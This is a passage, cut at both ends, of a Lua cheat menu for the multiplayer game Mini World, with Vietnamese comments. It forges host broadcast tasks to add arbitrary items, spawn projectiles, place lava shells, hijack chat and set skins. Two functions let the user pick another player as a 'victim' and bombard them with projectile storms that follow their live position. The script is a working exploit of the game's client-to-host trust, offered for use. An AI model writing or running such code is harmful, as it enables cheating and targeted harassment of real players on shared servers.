                                        if ClientCurGame and ClientCurGame:isInGame() and CurMainPlayer then
                                            local myUin = AccountManager:getUin()
                                            
                                            local rawX, rawY, rawZ = CurMainPlayer:getPosition(0, 0, 0)
                                            local px = rawX / 100
                                            local py = rawY / 100
                                            local pz = rawZ / 100
                                            
                                            for i = 1, CONFIG.amount do
                                                local offsetX = (math.random() * CONFIG.length) - (CONFIG.length / 2)
                                                local offsetZ = (math.random() * CONFIG.width) - (CONFIG.width / 2)
                                                
                                                local x1 = px + offsetX
                                                local y1 = py + CONFIG.height
                                                local z1 = pz + offsetZ
                                                
                                                local x2 = x1
                                                local y2 = py - 10 
                                                local z2 = z1
                                                
                                                local tdata = {
                                                    [1] = "world", 
                                                    [2] = "spawnProjectile",
                                                    [3] = { myUin, CONFIG.projectileId, x1, y1 + 0.5, z1, x2, y2, z2, CONFIG.speed }
                                                }
                                                
                                                pcall(function()
                                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                                end)
                                            end
                                            
                                            ShowGameTipsWithoutFilter("Đã hoàn thành đợt mưa!")
                                        end
                                    end)
                                end
                            end
                        )
                    end)
                end)
            end)
        end)
    end)
end

function pctg7()
-- ==================== 1. ĐÓNG GIAO DIỆN TỰ ĐỘNG ====================
    pcall(function()
        GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
    end)

    -- ==================== 2. HỘP THOẠI XÁC NHẬN (YES/NO) Ở ĐẦU TIÊN ====================
    GetInst("MessageBoxInterface"):dualBtnBox(
        "Bạn có muốn bật hiệu ứng đổi màu cầu vồng và tính năng chat tự động không?",
        "Hủy",
        "Đồng ý",
        function(userData, btnType)
            -- btnType == 1 là nút Đồng ý
            if btnType == 1 then
                if not CurMainPlayer then
                    ShowGameTipsWithoutFilter("Không tìm thấy thông tin người chơi!")
                    return
                end

                -- Lấy chính xác tên hiện tại của nhân vật làm tên gốc
                local originalName = nil
                pcall(function()
                    if CurMainPlayer.getName then
                        originalName = CurMainPlayer:getName()
                    elseif CurMainPlayer.getNickname then
                        originalName = CurMainPlayer:getNickname()
                    end
                end)

                if not originalName or originalName == "" then
                    local selfUin = AccountManager and AccountManager.getUin and AccountManager:getUin() or 0
                    if GameVM and GameVM.Player then
                        _, originalName = GameVM.Player:getNickname(selfUin)
                    end
                end

                if not originalName or originalName == "" then
                    ShowGameTipsWithoutFilter("Không thể lấy được tên nhân vật của bạn!")
                    return
                end

                -- Biến toàn cục lưu trữ tên/màu sắc hiện tại của bạn theo thời gian thực
                _G.current_rainbow_nickname = originalName

                -- ==================== PHẦN A: KÍCH HOẠT CHAT TỰ ĐỘNG (CHUẨN MÀU MẶC ĐỊNH) ====================
                local function SendSelfChat(Text)
                    local selfUin = AccountManager and AccountManager.getUin and AccountManager:getUin() or 0
                    if selfUin <= 1000 then return end
                    
                    Text = tostring(Text or "")
                    if Text == "" then return end
                    
                    local playerName = _G.current_rainbow_nickname or originalName
                    
                    if not ScriptSupportTask or not ScriptSupportTask.reportTaskToHost or not SSTASKID then
                        return
                    end
                    
                    -- Thêm #n sau tên để ngắt màu tên, giữ nguyên màu mặc định/trắng cho nội dung chat phía sau
                    local tdata = {
                        [1] = "chat",
                        [2] = "sendChat",
                        [3] = { "#L" .. playerName .. "#n：#cffffff" .. Text, 1, 0 }
                    }
                    pcall(function() ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata) end)
                end

                -- Kích hoạt Hook chat tự động cho bản thân
                if ClientCurGame and ClientCurGame.sendChat and not _G._IsSendChatHooked then
                    ClientCurGame.sendChat = function(self, ...)
                        local args = {...}
                        local Text = tostring(args[1] or "")
                        SendSelfChat(Text)
                    end
                    _G._IsSendChatHooked = true
                end

                -- ==================== PHẦN B: HIỆU ỨNG CẦU VỒNG CHO TÊN ====================
                local raw_nickname = originalName

                _G.rainbow_name_generation = (_G.rainbow_name_generation or 0) + 1
                local currentGeneration = _G.rainbow_name_generation
                _G.rainbow_name_enabled = true

                local TARGET_UID = AccountManager:getUin()

                local function splitUtf8(str)
                    local characters = {}
                    for character in string.gmatch(str, "[%z\1-\127\194-\244][\128-\191]*") do
                        table.insert(characters, character)
                    end
                    return characters
                end

                local function hsvToRgb(hue, saturation, value)
                    local sector = math.floor(hue * 6)
                    local fraction = hue * 6 - sector

                    local p = value * (1 - saturation)
                    local q = value * (1 - fraction * saturation)
                    local t = value * (1 - (1 - fraction) * saturation)

                    sector = sector % 6

                    local red, green, blue
                    if sector == 0 then red, green, blue = value, t, p
                    elseif sector == 1 then red, green, blue = q, value, p
                    elseif sector == 2 then red, green, blue = p, value, t
                    elseif sector == 3 then red, green, blue = p, q, value
                    elseif sector == 4 then red, green, blue = t, p, value
                    else red, green, blue = value, p, q
                    end

                    return math.floor(red * 255 + 0.5),
                           math.floor(green * 255 + 0.5),
                           math.floor(blue * 255 + 0.5)
                end

                local function rgbToHex(red, green, blue)
                    return string.format("%02x%02x%02x", red, green, blue)
                end

                local function createSmoothRainbow(str, baseHue)
                    local characters = splitUtf8(str)
                    local result = {}
                    local letterIndex = 0

                    for _, character in ipairs(characters) do
                        if character == " " or character == "\n" then
                            table.insert(result, character)
                        else
                            local hue = (baseHue + letterIndex * 0.08) % 1
                            local red, green, blue = hsvToRgb(hue, 1, 1)

                            table.insert(result, "#c" .. rgbToHex(red, green, blue) .. character)
                            letterIndex = letterIndex + 1
                        end
                    end

                    return table.concat(result)
                end

                ShowGameTipsWithoutFilter("Đã bật hiệu ứng tên cầu vồng & chat chuẩn màu mặc định!")

                threadpool:work(function()
                    local baseHue = 0

                    while _G.rainbow_name_enabled and currentGeneration == _G.rainbow_name_generation do
                        local rainbowNickname = createSmoothRainbow(raw_nickname, baseHue)
                        
                        _G.current_rainbow_nickname = rainbowNickname

                        local tdata = {
                            [1] = "actor",
                            [2] = "setnickname",
                            [3] = {
                                TARGET_UID,
                                rainbowNickname
                            }
                        }

                        pcall(function()
                            if ScriptSupportTask and SSTASKID then
                                ScriptSupportTask:reportTaskToHost(
                                    SSTASKID.HOST_BordCast,
                                    tdata
                                )
                            end
                        end)

                        baseHue = (baseHue + 0.02) % 1
                        threadpool:wait(0.05)
                    end

                    -- KHI DỪNG / ẤN HỦY: Trả lại tên ban đầu và reset màu chat về mặc định tuyệt đối
                    _G.current_rainbow_nickname = originalName

                    local resetData = {
                        [1] = "actor",
                        [2] = "setnickname",
                        [3] = {
                            TARGET_UID,
                            originalName
                        }
                    }

                    pcall(function()
                        if ScriptSupportTask and SSTASKID then
                            ScriptSupportTask:reportTaskToHost(
                                SSTASKID.HOST_BordCast,
                                resetData
                            )
                        end
                    end)
                end)
            else
                -- NẾU ẤN HỦY NGAY TỪ ĐẦU
                _G.rainbow_name_enabled = false
            end
        end
    )
end

-- 自定大小
function zddx()
    ShowTextInputSafe(function(text)
        local value = tonumber(text)
        if not value then
            ShowGameTipsWithoutFilter("Vui lòng nhập một số hợp lệ (hệ số tỷ lệ)")
            return
        end
        local player = CurMainPlayer
        player:setCustomScale(value)
        player:syncCustomScale()
        ShowGameTips("自定大小已设置：" .. value, 3)
    end)
end

function pctg8()
    -- Đóng giao diện menu hiện tại
    pcall(function()
        GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
    end)

    -- Dừng luồng cũ nếu đang chạy trước khi bật luồng mới
    _G.dtly_enabled = false
    if _G.dtly_thread then
        _G.dtly_thread = nil
    end

    -- Sử dụng ShowTextInputSafe để nhập giá trị size (radius)
    ShowTextInputSafe(function(text)
        local value = tonumber(text)
        if not value or value <= 0 then
            ShowGameTipsWithoutFilter("Vui lòng nhập một số hợp lệ lớn hơn 0")
            return
        end
        
        local radius = value
        local outer_radius = radius + 2
        local airwall_radius = outer_radius + 3

        -- Hộp thoại xác nhận Yes/No trước khi tiến hành xây dựng
        GetInst("MessageBoxInterface"):dualBtnBox(
            "Bạn có muốn tạo khu vực đơn đấu với bán kính " .. radius .. " không?",
            "Hủy",
            "Đồng ý",
            function(userData, btnType)
                -- Nếu ấn Hủy (btnType tương ứng với nút bên trái, thường 0 là hủy)
                if btnType == 0 then
                    _G.dtly_enabled = false
                    ShowGameTipsWithoutFilter("#RĐã hủy lệnh tạo khu vực!")
                    return
                end

                if btnType == 1 then
                    _G.dtly_enabled = true
                    
                    -- Lấy vị trí hiện tại của người chơi làm tâm (có dự phòng nếu CurMainPlayer nil)
                    local center_x, center_y, center_z = 0, 0, 0
                    if CurMainPlayer then
                        local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
                        center_x, center_y, center_z = x / 100, y / 100, z / 100
                    end

                    ShowGameTipsWithoutFilter("#c00ff00Đang tiến hành tạo khu vực...")

                    -- Chạy tiến trình đặt khối để tránh làm đơ game
                    _G.dtly_thread = threadpool:work(function()
                        -- Bước 1: Sinh nội dung cầu rỗng (1221)
                        for ix = -radius, radius do
                            if not _G.dtly_enabled then return end
                            for iy = -radius, radius do
                                if not _G.dtly_enabled then return end
                                for iz = -radius, radius do
                                    if not _G.dtly_enabled then return end
                                    local dist = math.sqrt(ix*ix + iy*iy + iz*iz)
                                    if dist >= radius - 0.5 and dist <= radius + 0.5 then
                                        local tdata = {
                                            [1] = "block",
                                            [2] = "placeBlock",
                                            [3] = { 1221, center_x + ix, center_y + iy, center_z + iz, 0, -1 }
                                        }
                                        pcall(function() ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata) end)
                                    end
                                end
                            end
                        end

                        -- Bước 2: Sinh lớp dung nham (5)
                        for ix = -outer_radius, outer_radius do
                            if not _G.dtly_enabled then return end
                            for iy = -outer_radius, outer_radius do
                                if not _G.dtly_enabled then return end
                                for iz = -outer_radius, outer_radius do
                                    if not _G.dtly_enabled then return end
                                    local dist = math.sqrt(ix*ix + iy*iy + iz*iz)
                                    if dist >= outer_radius - 0.5 and dist <= outer_radius + 0.5 then
                                        local tdata = {
                                            [1] = "block",
                                            [2] = "placeBlock",
                                            [3] = { 5, center_x + ix, center_y + iy, center_z + iz, 0, -1 }
                                        }
                                        pcall(function() ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata) end)
                                    end
                                end
                            end
                        end

                        -- Bước 3: Sinh không gian tường chắn (1001)
                        for ix = -airwall_radius, airwall_radius do
                            if not _G.dtly_enabled then return end
                            for iy = -airwall_radius, airwall_radius do
                                if not _G.dtly_enabled then return end
                                for iz = -airwall_radius, airwall_radius do
                                    if not _G.dtly_enabled then return end
                                    local dist = math.sqrt(ix*ix + iy*iy + iz*iz)
                                    if dist >= airwall_radius - 0.5 and dist <= airwall_radius + 0.5 then
                                        local tdata = {
                                            [1] = "block",
                                            [2] = "placeBlock",
                                            [3] = { 1001, center_x + ix, center_y + iy, center_z + iz, 0, -1 }
                                        }
                                        pcall(function() ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata) end)
                                    end
                                end
                            end
                        end

                        -- Bước 4: Tạo hiệu ứng sấm sét xoay quanh khu vực
                        ShowGameTipsWithoutFilter("#c00ff00Bắt đầu phát sét lặp quanh khu vực...")

                        local lightning_positions = {}
                        for radius_mult = 1, 3 do
                            local current_radius = airwall_radius + 3 + radius_mult * 2
                            for angle1 = 0, 360, 30 do
                                for angle2 = -60, 60, 30 do
                                    local rad1 = math.rad(angle1)
                                    local rad2 = math.rad(angle2)
                                    local px = center_x + current_radius * math.cos(rad1) * math.cos(rad2)
                                    local py = center_y + current_radius * math.sin(rad2) + 5
                                    local pz = center_z + current_radius * math.sin(rad1) * math.cos(rad2)
                                    table.insert(lightning_positions, {x = px, y = py, z = pz})
                                end
                            end
                        end

                        for i = 1, 20 do
                            local random_angle = math.random(0, 360)
                            local random_height = math.random(-10, 20)
                            local random_radius = airwall_radius + math.random(2, 8)
                            local rad = math.rad(random_angle)
                            local px = center_x + random_radius * math.cos(rad)
                            local py = center_y + random_height
                            local pz = center_z + random_radius * math.sin(rad)
                            table.insert(lightning_positions, {x = px, y = py, z = pz})
                        end

                        ShowGameTipsWithoutFilter("#c00ff00Đã tạo tổng cộng " .. #lightning_positions .. " vị trí sét")

                        local index = 1
                        while _G.dtly_enabled do
                            for i = 1, 5 do
                                if not _G.dtly_enabled then break end
                                local pos_index = (index + i * 7) % #lightning_positions + 1
                                local pos = lightning_positions[pos_index]
                                local scale = math.random(2, 5)
                                local duration = math.random(15, 25)
                                
                                pcall(function()
                                    CurWorld:playSoundAndParticleEffect(
                                        pos.x, pos.y, pos.z, 0, 0, 0, 0,
                                        pos.x, pos.y, pos.z,
                                        'particles/aotu_06_leishenzhichui.ent', scale, duration
                                    )
                                end)
                            end
                            index = index + 1
                            if index > #lightning_positions then
                                index = 1
                            end
                            threadpool:wait(0.05)
                        end
                    end)
                end
            end
        )
    end)
end

function pctg9()
    -- Đóng giao diện menu nếu đang mở
    pcall(function()
        GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
    end)

    -- Kiểm tra xem đang ở trong game không
    if not ClientCurGame or not ClientCurGame:isInGame() then
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("#R请先进入游戏房间", 3)
        end
        return
    end

    -- BẢNG YES/NO ĐẦU TIÊN: Quản lý trạng thái Dừng / Tiếp tục nhập
    GetInst("MessageBoxInterface"):dualBtnBox(
        "Trái: Dừng bão vật ném ngay lập tức\nPhải: Tiếp tục thiết lập và bắn bão vật ném",
        "Dừng lại",  -- Nút trái (btnType == 0) -> Dừng bắn
        "Đồng ý",   -- Nút phải (btnType == 1) -> Hiện bảng nhập liệu tiếp theo
        function(userData, btnType)
            if btnType == 0 then
                -- Dừng bão vật ném
                _G.stormRainActive = false
                ShowGameTipsWithoutFilter("#cFF0000Đã gửi lệnh dừng bão vật ném!")
                
            elseif btnType == 1 then
                -- Tiếp tục: Mở bảng nhập ID vật ném trước tiên
                if ShowGameTipsWithoutFilter then
                    ShowGameTipsWithoutFilter("#c00ffffVui lòng nhập ID VẬT NÉM (VD: 12837)")
                end

                ShowTextInputSafe(function(idText)
                    local projectileId = tonumber(idText)
                    if not projectileId or projectileId <= 0 then
                        ShowGameTipsWithoutFilter("#cFF0000ID vật ném không hợp lệ! Mặc định dùng 12837.")
                        projectileId = 12837
                    end

                    -- Bước 1: Thông báo và mở bảng nhập Độ cao
                    if ShowGameTipsWithoutFilter then
                        ShowGameTipsWithoutFilter("#c00ffffVui lòng nhập ĐỘ CAO trên trời (VD: 25)")
                    end

                    ShowTextInputSafe(function(heightText)
                        local customHeight = tonumber(heightText)
                        if not customHeight or customHeight <= 0 then
                            ShowGameTipsWithoutFilter("#cFF0000Độ cao không hợp lệ! Mặc định dùng 25.")
                            customHeight = 25
                        end

                        -- Bước 2: Thông báo và mở bảng nhập Số lượng vật ném mỗi đợt
                        if ShowGameTipsWithoutFilter then
                            ShowGameTipsWithoutFilter("#c00ffffVui lòng nhập SỐ LƯỢNG vật ném mỗi đợt (VD: 5)")
                        end

                        ShowTextInputSafe(function(countText)
                            local projectileCount = tonumber(countText)
                            if not projectileCount or projectileCount <= 0 then
                                ShowGameTipsWithoutFilter("#cFF0000Số lượng không hợp lệ! Mặc định dùng 5.")
                                projectileCount = 5
                            end

                            -- Bước 3: Thông báo và mở bảng nhập Số lượng điểm ngẫu nhiên
                            if ShowGameTipsWithoutFilter then
                                ShowGameTipsWithoutFilter("#c00ffffVui lòng nhập SỐ ĐIỂM NGẪU NHIÊN trên trời (VD: 3)")
                            end

                            ShowTextInputSafe(function(spotText)
                                local randomSpots = tonumber(spotText)
                                if not randomSpots or randomSpots <= 0 then
                                    ShowGameTipsWithoutFilter("#cFF0000Số điểm không hợp lệ! Mặc định dùng 3.")
                                    randomSpots = 3
                                end

                                -- Mở bảng chọn người chơi mục tiêu
                                LoadHomelandLuas()
                                local uin_list = GetPlayerUinList()

                                if not uin_list or #uin_list == 0 then
                                    ShowGameTipsWithoutFilter("#R当前房间没有其他玩家", 3)
                                    return
                                end

                                local data = {
                                    visit = {
                                        history_num = "Chọn mục tiêu bão vật ném",
                                        today_num = "#cFF7aad Tổng số: " .. #uin_list
                                    },
                                    event_home = {{param1 = 0, event_id = 5, event_time = 0}},
                                    event_visit = {}
                                }

                                for i = 1, #uin_list do
                                    data.event_visit[i] = {uin = uin_list[i], event_id = 5, event_time = 0}
                                end

                                GetInst("UIManager"):Open("HomeEventRecord")
                                local ctrl = GetInst("UIManager"):GetCtrl("HomeEventRecord")
                                ctrl:UpdateUI(data)
                                
                                getglobal("HomeEventRecordTitleFrameName"):SetText("Chọn mục tiêu để tạo bão vật ném")
                                getglobal("HomeEventRecordTodayVisterText"):SetText("#cFF7aad Danh sách phòng")
                                getglobal("HomeEventRecordTotalVisterText"):SetText("#cFF7aad Nhấn vào người chơi để bắt đầu")

                                local oldClickFunc = ctrl.EnterFriendHomeBtn_OnClick
                                
                                function ctrl:EnterFriendHomeBtn_OnClick()
                                    GetInst("UIManager"):Close("HomeEventRecord")
                                    ctrl.EnterFriendHomeBtn_OnClick = oldClickFunc

                                    local targetUin = this:GetClientID()
                                    local selfUin = AccountManager:getUin()

                                    if targetUin == selfUin then
                                        ShowGameTipsWithoutFilter("#RKhông thể chọn chính mình làm mục tiêu!")
                                        return
                                    end

                                    -- Bước 4: Hiện bảng xác nhận Yes/No trước khi bắt đầu bắn liên tục
                                    GetInst("MessageBoxInterface"):dualBtnBox(
                                        "⚠️ Xác nhận bão vật ném ⚠️\n- Mục tiêu UIN: " .. tostring(targetUin) .. "\n- ID vật ném: " .. projectileId .. "\n- Độ cao: " .. customHeight .. "\n- Số lượng/đợt: " .. projectileCount .. "\n- Điểm ngẫu nhiên: " .. randomSpots,
                                        "Hủy",     -- Nút trái (btnType == 0) -> Dừng / Hủy
                                        "Đồng ý",  -- Nút phải (btnType == 1) -> Bắt đầu bão vật ném liên tục
                                        function(userData, btnType)
                                            if btnType == 1 then
                                                ShowGameTipsWithoutFilter("#c00ffffĐã BẬT bão vật ném bám đuổi mục tiêu: " .. targetUin)

                                                -- Bật cờ cho phép chạy vòng lặp liên tục
                                                _G.stormRainActive = true

                                                -- Chạy luồng ngầm tạo bão vật ném liên tục bám theo nạn nhân
                                                threadpool:work(function()
                                                    while _G.stormRainActive do
                                                        pcall(function()
                                                            local targetPlayer = ClientCurGame:getPlayerByUin(targetUin)
                                                            if targetPlayer then
                                                                -- Lấy tọa độ THỜI GIAN THỰC của nạn nhân (dù chạy đi đâu cũng bị đuổi theo)
                                                                local x, y, z = targetPlayer:getPosition(0, 0, 0)
                                                                local targetX = x / 100
                                                                local targetY = y / 100
                                                                local targetZ = z / 100

                                                                -- Vòng lặp tạo ngẫu nhiên nhiều điểm rớt trên trời ngay trên đầu nạn nhân
                                                                for s = 1, randomSpots do
                                                                    local offsetX = math.random(-6, 6)
                                                                    local offsetZ = math.random(-6, 6)
                                                                    
                                                                    local destX = targetX + offsetX
                                                                    local destY = targetY
                                                                    local destZ = targetZ + offsetZ

                                                                    -- Điểm xuất phát trên trời luôn bám theo đầu nạn nhân
                                                                    local startX = destX + math.random(-2, 2)
                                                                    local startY = targetY + customHeight
                                                                    local startZ = destZ + math.random(-2, 2)

                                                                    for p = 1, projectileCount do
                                                                        local speed = 900

                                                                        local tdata = {
                                                                            [1] = "world",
                                                                            [2] = "spawnProjectile",
                                                                            [3] = { selfUin, projectileId, startX, startY, startZ, destX, destY, destZ, speed }
                                                                        }

                                                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                                                    end
                                                                end
                                                            end
                                                        end)

                                                        -- Tốc độ xả bão đạn liên tục
                                                        threadpool:wait(0.1)
                                                    end
                                                    
                                                    ShowGameTipsWithoutFilter("#cFF0000Đã dừng bão vật ném!")
                                                end)
                                            else
                                                ShowGameTipsWithoutFilter("#cFF0000Đã hủy thao tác bão vật ném!")
                                            end
                                        end
                                    )
                                end
                            end, "Nhập số lượng điểm ngẫu nhiên")
                        end, "Nhập số lượng vật ném")
                    end, "Nhập độ cao")
                end, "Nhập ID vật ném")
            end
        end
    )
end

function pctg10()
    -- Đóng giao diện menu nếu đang mở
    pcall(function()
        GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
    end)

    -- Kiểm tra xem đang ở trong game không
    if not ClientCurGame or not ClientCurGame:isInGame() then
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("#R请先进入游戏房间", 3)
        end
        return
    end

    -- BẢNG YES/NO ĐẦU TIÊN: Quản lý trạng thái Dừng / Tiếp tục nhập
    GetInst("MessageBoxInterface"):dualBtnBox(
        "Trái: Dừng bắn vật ném ngay lập tức\nPhải: Tiếp tục thiết lập và bắn vật ném",
        "Dừng lại",  -- Nút trái (btnType == 0) -> Dừng bắn
        "Đồng ý",   -- Nút phải (btnType == 1) -> Hiện bảng nhập liệu tiếp theo
        function(userData, btnType)
            if btnType == 0 then
                -- Dừng bắn vật ném
                _G.stormRainActive = false
                ShowGameTipsWithoutFilter("#cFF0000Đã gửi lệnh dừng bắn vật ném!")
                
            elseif btnType == 1 then
                -- Tiếp tục: Mở chuỗi bảng nhập liệu

                -- Bước 1: Thông báo và mở bảng nhập ID vật ném
                if ShowGameTipsWithoutFilter then
                    ShowGameTipsWithoutFilter("#c00ffffVui lòng nhập ID VẬT NÉM (VD: 15508)")
                end

                ShowTextInputSafe(function(idText)
                    local projectileId = tonumber(idText)
                    if not projectileId or projectileId <= 0 then
                        ShowGameTipsWithoutFilter("#cFF0000ID không hợp lệ! Mặc định dùng 15508.")
                        projectileId = 15508
                    end

                    -- Bước 2: Thông báo và mở bảng nhập Tốc độ bay (Tốc độ càng nhỏ quỹ đạo bay càng cong vút lên cao)
                    if ShowGameTipsWithoutFilter then
                        ShowGameTipsWithoutFilter("#c00ffffVui lòng nhập TỐC ĐỘ bay (VD: 400 - 600 để bay cao uốn lượn)")
                    end

                    ShowTextInputSafe(function(speedText)
                        local customSpeed = tonumber(speedText)
                        if not customSpeed or customSpeed <= 0 then
                            ShowGameTipsWithoutFilter("#cFF0000Tốc độ không hợp lệ! Mặc định dùng 500.")
                            customSpeed = 500
                        end

                        -- Bước 3: Thông báo và mở bảng nhập Số lượng vật ném mỗi đợt
                        if ShowGameTipsWithoutFilter then
                            ShowGameTipsWithoutFilter("#c00ffffVui lòng nhập SỐ LƯỢNG vật ném mỗi đợt (VD: 5)")
                        end

                        ShowTextInputSafe(function(countText)
                            local projectileCount = tonumber(countText)
                            if not projectileCount or projectileCount <= 0 then
                                ShowGameTipsWithoutFilter("#cFF0000Số lượng không hợp lệ! Mặc định dùng 5.")
                                projectileCount = 5
                            end

                            -- Mở bảng chọn người chơi mục tiêu
                            LoadHomelandLuas()
                            local uin_list = GetPlayerUinList()

                            if not uin_list or #uin_list == 0 then
                                ShowGameTipsWithoutFilter("#R当前房间没有其他玩家", 3)
                                return
                            end

                            local data = {
                                visit = {
                                    history_num = "Chọn mục tiêu bắn vật ném",
                                    today_num = "#cFF7aad Tổng số: " .. #uin_list
                                },
                                event_home = {{param1 = 0, event_id = 5, event_time = 0}},
                                event_visit = {}
                            }

                            for i = 1, #uin_list do
                                data.event_visit[i] = {uin = uin_list[i], event_id = 5, event_time = 0}
                            end

                            GetInst("UIManager"):Open("HomeEventRecord")
                            local ctrl = GetInst("UIManager"):GetCtrl("HomeEventRecord")
                            ctrl:UpdateUI(data)
                            
                            getglobal("HomeEventRecordTitleFrameName"):SetText("Chọn mục tiêu để bắn vật ném")
                            getglobal("HomeEventRecordTodayVisterText"):SetText("#cFF7aad Danh sách phòng")
                            getglobal("HomeEventRecordTotalVisterText"):SetText("#cFF7aad Nhấn vào người chơi để bắt đầu")

                            local oldClickFunc = ctrl.EnterFriendHomeBtn_OnClick
                            
                            function ctrl:EnterFriendHomeBtn_OnClick()
                                GetInst("UIManager"):Close("HomeEventRecord")
                                ctrl.EnterFriendHomeBtn_OnClick = oldClickFunc

                                local targetUin = this:GetClientID()
                                local selfUin = AccountManager:getUin()

                                if targetUin == selfUin then
                                    ShowGameTipsWithoutFilter("#RKhông thể chọn chính mình làm mục tiêu!")
                                    return
                                end

                                -- Bước 4: Hiện bảng xác nhận Yes/No trước khi bắt đầu bắn liên tục
                                GetInst("MessageBoxInterface"):dualBtnBox(
                                    "⚠️ Xác nhận bắn vật ném uốn lượn ⚠️\n- Mục tiêu UIN: " .. tostring(targetUin) .. "\n- ID vật ném: " .. projectileId .. "\n- Tốc độ đạn: " .. customSpeed .. "\n- Số lượng/đợt: " .. projectileCount,
                                    "Hủy",     -- Nút trái (btnType == 0) -> Dừng / Hủy
                                    "Đồng ý",  -- Nút phải (btnType == 1) -> Bắt đầu bắn
                                    function(userData, btnType)
                                        if btnType == 1 then
                                            ShowGameTipsWithoutFilter("#c00ffffĐã BẬT bắn vật ném bay lên trời rồi hướng về mục tiêu: " .. targetUin)

                                            -- Bật cờ cho phép chạy vòng lặp liên tục
                                            _G.stormRainActive = true

                                            -- Chạy luồng ngầm tạo vật ném liên tục
                                            threadpool:work(function()
                                                while _G.stormRainActive do
                                                    pcall(function()
                                                        -- Lấy tọa độ hiện tại của BẠN (điểm xuất phát từ người bạn)
                                                        local myPlayer = CurMainPlayer
                                                        if not myPlayer then return end
                                                        local myX, myY, myZ = myPlayer:getPosition(0, 0, 0)
                                                        local srcX = myX / 100
                                                        local srcY = myY / 100
                                                        local srcZ = myZ / 100

                                                        -- Lấy tọa độ của NẠN NHÂN (điểm đến)
                                                        local targetPlayer = ClientCurGame:getPlayerByUin(targetUin)
                                                        if targetPlayer then
                                                            local tx, ty, tz = targetPlayer:getPosition(0, 0, 0)
                                                            local targetX = tx / 100
                                                            local targetY = ty / 100
                                                            local targetZ = tz / 100

                                                            -- Bắn một loạt số lượng vật ném từ bạn hướng thẳng tới nạn nhân theo quỹ đạo parabol
                                                            for p = 1, projectileCount do
                                                                local tdata = {
                                                                    [1] = "world",
                                                                    [2] = "spawnProjectile",
                                                                    [3] = { selfUin, projectileId, srcX, srcY, srcZ, targetX, targetY, targetZ, customSpeed }
                                                                }
                                                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                                            end
                                                        end
                                                    end)

                                                    -- Tốc độ xả đạn liên tục (0.3 giây / đợt)
                                                    threadpool:wait(0.1)
                                                end
                                                
                                                ShowGameTipsWithoutFilter("#cFF0000Đã dừng bắn vật ném!")
                                            end)
                                        else
                                            ShowGameTipsWithoutFilter("#cFF0000Đã hủy thao tác!")
                                        end
                                    end
                                )
                            end
                        end, "Nhập số lượng vật ném")
                    end, "Nhập tốc độ bay (VD: 500)")
                end, "Nhập ID vật ném")
            end
        end
    )
end

-- id取物
function bbqw()
    GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")

-- 左边：ID取物 | 右边：编辑器取物
GetInst("MessageBoxInterface"):dualBtnBox(
    "Lấy các mục sử dụng ID ở bên trái\nLấy các mục từ kho đồ ở bên phải",  -- 消息内容
    "确定",                   -- 标题
    nil,                          -- 图标
    function(userData, btnType)
        if btnType == 0 then  -- 左边按钮：ID取物
            -- ===== ID取物 =====
            ShowTextInputSafe(function(text)
                if #text == 0 then 
                    ShowGameTipsWithoutFilter("Dữ liệu đầu vào không được để trống")
                    return 
                end
                
                local uin = AccountManager:getUin()
                local itemId, itemCount
                
                -- 尝试解析逗号分隔的格式，例如 "123,64"
                local commaPos = string.find(text, ",")
                if commaPos then
                    local parts = {}
                    for part in string.gmatch(text, "[^,]+") do
                        table.insert(parts, part)
                    end
                    itemId = tonumber(parts[1]) or 0
                    itemCount = tonumber(parts[2]) or 64
                else
                    -- 纯数字，当作物品ID，数量默认为64
                    itemId = tonumber(text) or 0
                    itemCount = 64
                end
                
                if itemId == 0 then
                    ShowGameTipsWithoutFilter("Mục không hợp lệID")
                    return
                end
                
                -- 发送添加物品广播
                local tdata = {
                    [1] = "backpack",
                    [2] = "addItem",
                    [3] = { uin, itemId, itemCount }
                }
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                ShowGameTipsWithoutFilter(string.format("Thêm mục：%d Số lượng：%d", itemId, itemCount))
            end, "Nhập mụcID,Số lượng（Ví dụ 123,64）")
            -- ====================
            
        elseif btnType == 1 then  -- Nút bên phải：Truy xuất đối tượng trình chỉnh sửa
            -- ===== 编辑器取物 =====
            threadpool:work(function()
                local isInGame = ClientCurGame:isInGame()
                if isInGame then
                    local param = {
                        useLibrary = 2,
                        sstype = {modpacketid = "", modlib = false}
                    }
                    param.callback = function(ID)
                        if ID and ID ~= 0 then
                            local itemDef = ItemDefCsv:get(ID)
                            if itemDef then
                                local tdata = {}
                                tdata[1] = "backpack"
                                tdata[2] = "addItem"
                                tdata[3] = {AccountManager:getUin(), ID, itemDef.StackMax}
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                ShowGameTipsWithoutFilter("#cFF7aad" .. itemDef.Name .. "Đã thêm thành công")
                            end
                        end
                    end
                    GetInst("MiniUIManager"):OpenUI("ResourceSelectorFrame", "miniui/miniworld/ugc_resourceselector", "ResourceSelectorFrameAutoGen", param)
                else
                    ShowGameTipsWithoutFilter("Chưa có trên bản đồ，Không có sẵn")
                end
            end)
            -- ====================
        end
    end
)
end

-- 武器皮肤
function wqpf()
    ShowTextInputSafe(function(text)
        local value = tonumber(text)
        if not value then
            ShowGameTipsWithoutFilter("请输入有效皮肤ID数字")
            return
        end
        local uin = AccountManager:getUin()
        SandboxMgr:sendToHost(
            "UPDATE_WEAPON_SKIN_INFO_HOST",
            '{"uin":"' .. uin .. '","skinList":{"' .. uin .. '":[' .. value .. ',' .. value .. ',' .. value .. ',' .. value .. ',' .. value .. ',' .. value .. ',' .. value .. ',' .. value .. ']}}'
        )
    end)
end

-- 召唤宠物
function zhcw()
